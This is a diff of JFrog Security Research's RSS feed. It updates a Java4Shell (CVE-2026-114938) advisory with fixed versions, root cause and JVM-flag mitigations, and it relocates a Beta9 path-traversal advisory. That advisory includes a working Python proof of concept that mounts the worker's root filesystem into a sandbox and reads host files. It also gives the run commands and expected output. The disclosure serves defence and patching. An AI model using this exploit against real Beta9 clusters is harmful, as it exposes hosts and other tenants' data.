@@ -4,7 +4,7 @@
         <title>JFrog Security Research</title>
         <link>https://research.jfrog.com</link>
         <description>Homepage feed: latest vulnerabilities and security research posts from JFrog Security Research.</description>
-        <lastBuildDate>Tue, 17 Nov 2026 20:20:33 GMT</lastBuildDate>
+        <lastBuildDate>Tue, 17 Nov 2026 22:32:53 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Home RSS</generator>
         <language>en</language>
@@ -16,53 +16,56 @@
             <pubDate>Tue, 17 Nov 2026 00:00:00 GMT</pubDate>
             <description><![CDATA[A critical remote code execution vulnerability affecting OpenJDK Java 17 has been reported under CVE-2026-114938.]]></description>
             <content:encoded><![CDATA[
-A critical remote code execution vulnerability affecting OpenJDK Java 17 has been reported under CVE-2026-114938, informally known as **Java4Shell** (also referred to as Java2Shell). The vulnerability is reportedly exploitable without authentication and has been assigned a preliminary CVSS v4.0 score of 9.2 (Critical).
+A critical remote code execution vulnerability affecting OpenJDK Java 17, 21, 25 and 27 has been reported under CVE-2026-114938, informally known as **Java4Shell** (also referred to as Java2Shell). The vulnerability is reportedly exploitable without authentication (in some cases) and has been assigned a preliminary CVSS v4.0 score of 9.2 (Critical).
 
 The vulnerability was reported by **Calif**, which announced its discovery and the planned technical disclosure in [this post on X](https://x.com/calif_io/status/2122724367654334810).
 
 With Java widely used across enterprise applications, backend services, and production environments, organizations should start identifying potentially affected Java deployments and prepare for remediation.
 
-**This is an evolving security issue. The information currently available is preliminary, and several technical details have not yet been publicly confirmed. We will update this article as more information becomes available, including the vulnerability's root cause, affected versions, exploitation conditions, and remediation guidance.**
+**Affected and Fixed Versions**
 
-**Important: At the time of writing, no security patch or confirmed fixed version for CVE-2026-114938 is publicly available.** Technical details are scheduled to be published on November 17, 2026, at 1:00 PM Pacific Time, following Oracle's November security patch release and will address 11 different security vulnerabilities including CVE-2026-114938.
+Java4Shell affects OpenJDK and Java SE in branches 17.x, 21.x, 25.x and 27.x
 
-**Affected Versions and Packages**
+The following fixed versions were released -
 
-Based on current intelligence and preliminary reports, the vulnerability impacts several versions of Java across different distributions:
+17.0.21.1, 21.0.13.1, 25.0.5.1, 27.0.1.1
 
-> * **OpenJDK:** Versions **17.0.6 and later** are reported to be vulnerable to CVE-2026-114938.  
-> * **Oracle Java SE:** Java SE 8, 11, 17, 21, 25, and 27 are listed as affected versions of the upcoming Oracle patch. However, that patch addresses multiple vulnerabilities, so it is not yet confirmed that these versions are affected by this specific CVE.
-
-Organizations must urgently inventory their Java applications, deployments, and internet-facing instances to determine their exposure footprint.
+Organizations must urgently inventory their Java applications, deployments, and internet-facing instances and update to one of the fixed versions mentioned above.
 
 ## **What Is Java4Shell?**
 
-Java4Shell is the informal name given to CVE-2026-114938 by **Calif**, the security research firm that reported discovering the vulnerability.
+Java4Shell is the informal name given to CVE-2026-114938 by **Calif**, the security research firm that reported the vulnerability. In its [announcement on X](https://x.com/calif_io/status/2122724367654334810), Calif reported the discovery and later [published the technical details](https://calif.io/java4shell/) following Oracle's November security patch release.
 
-In its [announcement on X](https://x.com/calif_io/status/2122724367654334810), Calif reported the discovery and announced plans to publish the technical details following Oracle's November security patch release.
+According to Calif, Java4Shell is a memory-corruption bug in the x86-64 intrinsic implementation of OpenJDK's Base64 decoder. When the decoder processes padded input (a stray `=` character), it miscalculates the store mask, causing an out-of-bounds heap write past the end of the output buffer. Calif says this can be leveraged for heap disclosure (Heartbleed-style) and for remote code execution.
 
-According to preliminary reports, the vulnerability affects OpenJDK Java 17 and could allow unauthenticated attackers to execute arbitrary code remotely on vulnerable systems. A successful attack could result in code execution with the privileges of the affected Java process, potentially exposing sensitive information, compromising application environments, or disrupting services.
+In essence, any application that decodes externally-supplied Base64 content could be affected -
 
-The vulnerability has reportedly been assigned a CVSS v4.0 score of **9.2 (Critical)**. Early reports also describe memory corruption as the underlying issue.
+```
+import java.util.Base64;
+Base64.Decoder decoder = Base64.getDecoder();
+decoder.decode(EXTERNAL_INPUT, ...)
+```
+
+
+
+The issue only affects x86-64 CPUs that support AVX-512 VBMI (ARM64 is not affected), and impacts OpenJDK 17.0.6 and newer as well as derivatives such as Temurin, Corretto and Oracle Java SE. Calif also claims that several popular Java-based products can be exploited this way, in some cases without authentication.
+
+
 
 ## **Is Java4Shell Already Detected by JFrog Xray?**
 
 **Yes. CVE-2026-114938 is already represented in JFrog Xray and JFrog Catalog.**
 
-Our Security Research team continues to monitor new findings and will update vulnerability coverage and contextual analysis capabilities as additional technical details become available.
 
-This is particularly relevant for Java environments, where applications may include runtimes and dependencies through multiple layers of their software supply chain. Identifying a vulnerability in an inventory is an important first step, but understanding whether an application is actually exposed requires additional context about its usage.
 
 ## **Recommended Mitigation and Remediation**
 
-Until a confirmed security update becomes available for CVE-2026-114938, organizations should prepare to identify and remediate potentially affected environments.
+Updating to one of the fixed versions is the best fix for Java4Shell.
 
-We recommend the following actions:
+If updating is not possible, the following mitigations are available (either one would deny exploitation of the vulnerability) -
 
-1. **Identify Java deployments.** Use JFrog Xray to identify relevant Java components and versions across your software supply chain. Include direct and transitive dependencies, bundled runtimes, container images, and application-specific JDK installations.  
-2. **Inventory Java runtime versions.** Identify the Java vendor, distribution, exact version, and build used by each application. Do not limit the investigation to system-installed Java runtimes, as applications and containers may bundle their own copies.  
-3. **Prioritize externally accessible applications.** Review internet-facing Java services and identify unnecessary external access paths. Restrict access where operationally feasible while waiting for confirmed remediation guidance.  
-4. **Prepare to apply security updates.** Monitor Oracle and other Java distribution vendors for security advisories and fixed releases. Once a relevant security update becomes available, apply it and rebuild affected application images where necessary.]]></content:encoded>
+* Start OpenJDK with `-XX:-UseBASE64Intrinsics`
+* Start OpenJDK with `-XX:UseAVX=2`]]></content:encoded>
         </item>
         <item>
             <title><![CDATA[httpx is vulnerable to Remote Code Execution via Oj Object-Mode JSON Deserialization]]></title>
@@ -764,141 +767,6 @@ https://github.com/beam-cloud/beta9
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</guid>
-            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-120308, CRITICAL, Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal
-
-
-## Component
-
-Beta9 gateway and worker (github.com/beam-cloud/beta9)
-
-## Affected versions
-
-gateway < 0.1.776
-worker < 0.1.756
-
-## Description
-
-A tenant who deploys a function, endpoint, or task queue on Beta9 can attach a volume. `ConfigureContainerRequestMounts` in `pkg/abstractions/common/mount.go` builds the host path by joining the shared volumes root, the workspace name, and the volume identifier from the stub. Nothing checks that the identifier names a volume that workspace owns. Parent-directory segments in the identifier collapse the joined path to the worker's filesystem root. The worker bind-mounts that path into the sandbox. The mount is read-write unless the volume was explicitly marked read-only, which is not the default.
-
-A workspace token is enough. On gateway 0.1.769 and worker 0.1.745, a volume identifier made of parent-directory segments made the container mount show the worker root: the worker hostname and resolver configuration were readable from inside the sandbox, and the directory listing contained host directories rather than an empty tenant volume. Other tenants' volumes stored on that host are on the same filesystem. The proof read those files. It was not run against a live multi-tenant cluster.
-
-Gateway 0.1.776 and worker 0.1.756 reject an identifier that is empty, `.`, `..`, or contains a slash, and a mount path that contains a `..` segment. The gateway also refuses a volume the workspace does not own. Stubs saved before the check existed are validated when they are launched, so both components need the upgrade.
-
-## PoC
-
-<br>
-
-**Step 1 - Install the client and select the deployment**
-
-<br>
-
-```
-pip install beta9
-beta9 configure --token <ANY_WORKSPACE_TOKEN>
-```
-
-<br>
-
-**Step 2 - Save the volume deploy**
-
-<br>
-
-The subclass marks the volume ready so the client sends the identifier as given, instead of looking up a real volume first. The function then reads two files through the resulting mount and lists the mount root.
-
-```
-import os
-
-from beta9 import Image, function
-from beta9.abstractions.volume import Volume
-
-
-class TraversalVolume(Volume):
-    def __init__(self, volume_id: str, mount_path: str):
-        super().__init__(name="poc", mount_path=mount_path)
-        self.volume_id = volume_id
-        self.ready = True
-
-
-HOST_ROOT = TraversalVolume(volume_id="../../..", mount_path="/pwn")
-
-
-@function(volumes=[HOST_ROOT], image=Image(), cpu=0.5, memory=256)
-def read_worker_host():
-    proof = {}
-    for f in ("/pwn/etc/hostname", "/pwn/etc/resolv.conf"):
-        try:
-            with open(f) as fh:
-                proof[f] = fh.read()[:200]
-        except Exception as e:
-            proof[f] = f"<unreadable: {e}>"
-    proof["/pwn (host /)"] = sorted(os.listdir("/pwn"))
-    return proof
-
-
-if __name__ == "__main__":
-    result = read_worker_host.remote()
-    print("\n===== PoC result (executed inside the sandboxed container) =====")
-    for k, v in result.items():
-        print(f"\n--- {k} ---\n{v}")
-```
-
-<br>
-
-**Step 3 - Deploy and run it**
-
-<br>
-
-```
-python3 poc_volume_traversal.py
-```
-
-<br>
-
-Expected output on gateway 0.1.769 with worker 0.1.745. `/pwn` is the worker root, so the listing contains host directories such as `/data`, `/root`, and `/run`, and the hostname file is the worker's:
-
-```
-===== PoC result (executed inside the sandboxed container) =====
-
---- /pwn/etc/hostname ---
-<worker hostname>
-
---- /pwn/etc/resolv.conf ---
-<worker resolver configuration>
-
---- /pwn (host /) ---
-['bin', 'data', 'etc', 'lib', 'root', 'run', ...]
-```
-
-<br>
-
-On gateway 0.1.776 or later, together with worker 0.1.756 or later, stub creation rejects the identifier and the function does not start.
-
-## Vulnerability Mitigations
-
-Upgrade the gateway to 0.1.776 or later and the worker to 0.1.756 or later. Volume identifiers and mount paths are validated before a mount is built, and the gateway rejects a volume that does not exist or is not owned by the workspace. Upgrade both. A stub saved by an old gateway is checked again when a new worker launches it, and an old worker still mounts the path an old gateway sends.
-
-The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released on 2026-09-15.
-
-## References
-https://www.cve.org/CVERecord?id=CVE-2026-120308
-https://github.com/beam-cloud/beta9/pull/1897
-https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
-https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.776
-https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
-https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.769
-https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.745
-https://github.com/beam-cloud/beta9
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Beta9 is vulnerable to a Container Escape via Unvalidated Sandbox File Paths]]></title>
             <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-container-escape-via-unvalidated-sandbox-file-paths-cve-2026-120307/</link>
             <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-container-escape-via-unvalidated-sandbox-file-paths-cve-2026-120307/</guid>
@@ -1102,6 +970,141 @@ https://www.cve.org/CVERecord?id=CVE-2026-120307
 https://github.com/beam-cloud/beta9/pull/1897
 https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
 https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
+https://github.com/beam-cloud/beta9
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</guid>
+            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-120308, CRITICAL, Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal
+
+
+## Component
+
+Beta9 gateway and worker (github.com/beam-cloud/beta9)
+
+## Affected versions
+
+gateway < 0.1.776
+worker < 0.1.756
+
+## Description
+
+A tenant who deploys a function, endpoint, or task queue on Beta9 can attach a volume. `ConfigureContainerRequestMounts` in `pkg/abstractions/common/mount.go` builds the host path by joining the shared volumes root, the workspace name, and the volume identifier from the stub. Nothing checks that the identifier names a volume that workspace owns. Parent-directory segments in the identifier collapse the joined path to the worker's filesystem root. The worker bind-mounts that path into the sandbox. The mount is read-write unless the volume was explicitly marked read-only, which is not the default.
+
+A workspace token is enough. On gateway 0.1.769 and worker 0.1.745, a volume identifier made of parent-directory segments made the container mount show the worker root: the worker hostname and resolver configuration were readable from inside the sandbox, and the directory listing contained host directories rather than an empty tenant volume. Other tenants' volumes stored on that host are on the same filesystem. The proof read those files. It was not run against a live multi-tenant cluster.
+
+Gateway 0.1.776 and worker 0.1.756 reject an identifier that is empty, `.`, `..`, or contains a slash, and a mount path that contains a `..` segment. The gateway also refuses a volume the workspace does not own. Stubs saved before the check existed are validated when they are launched, so both components need the upgrade.
+
+## PoC
+
+<br>
+
+**Step 1 - Install the client and select the deployment**
+
+<br>
+
+```
+pip install beta9
+beta9 configure --token <ANY_WORKSPACE_TOKEN>
+```
+
+<br>
+
+**Step 2 - Save the volume deploy**
+
+<br>
+
+The subclass marks the volume ready so the client sends the identifier as given, instead of looking up a real volume first. The function then reads two files through the resulting mount and lists the mount root.
+
+```
+import os
+
+from beta9 import Image, function
+from beta9.abstractions.volume import Volume
+
+
+class TraversalVolume(Volume):
+    def __init__(self, volume_id: str, mount_path: str):
+        super().__init__(name="poc", mount_path=mount_path)
+        self.volume_id = volume_id
+        self.ready = True
+
+
+HOST_ROOT = TraversalVolume(volume_id="../../..", mount_path="/pwn")
+
+
+@function(volumes=[HOST_ROOT], image=Image(), cpu=0.5, memory=256)
+def read_worker_host():
+    proof = {}
+    for f in ("/pwn/etc/hostname", "/pwn/etc/resolv.conf"):
+        try:
+            with open(f) as fh:
+                proof[f] = fh.read()[:200]
+        except Exception as e:
+            proof[f] = f"<unreadable: {e}>"
+    proof["/pwn (host /)"] = sorted(os.listdir("/pwn"))
+    return proof
+
+
+if __name__ == "__main__":
+    result = read_worker_host.remote()
+    print("\n===== PoC result (executed inside the sandboxed container) =====")
+    for k, v in result.items():
+        print(f"\n--- {k} ---\n{v}")
+```
+
+<br>
+
+**Step 3 - Deploy and run it**
+
+<br>
+
+```
+python3 poc_volume_traversal.py
+```
+
+<br>
+
+Expected output on gateway 0.1.769 with worker 0.1.745. `/pwn` is the worker root, so the listing contains host directories such as `/data`, `/root`, and `/run`, and the hostname file is the worker's:
+
+```
+===== PoC result (executed inside the sandboxed container) =====
+
+--- /pwn/etc/hostname ---
+<worker hostname>
+
+--- /pwn/etc/resolv.conf ---
+<worker resolver configuration>
+
+--- /pwn (host /) ---
+['bin', 'data', 'etc', 'lib', 'root', 'run', ...]
+```
+
+<br>
+
+On gateway 0.1.776 or later, together with worker 0.1.756 or later, stub creation rejects the identifier and the function does not start.
+
+## Vulnerability Mitigations
+
+Upgrade the gateway to 0.1.776 or later and the worker to 0.1.756 or later. Volume identifiers and mount paths are validated before a mount is built, and the gateway rejects a volume that does not exist or is not owned by the workspace. Upgrade both. A stub saved by an old gateway is checked again when a new worker launches it, and an old worker still mounts the path an old gateway sends.
+
+The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released on 2026-09-15.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-120308
+https://github.com/beam-cloud/beta9/pull/1897
+https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
+https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.776
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
+https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.769
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.745
 https://github.com/beam-cloud/beta9
 ]]></content:encoded>
         </item>
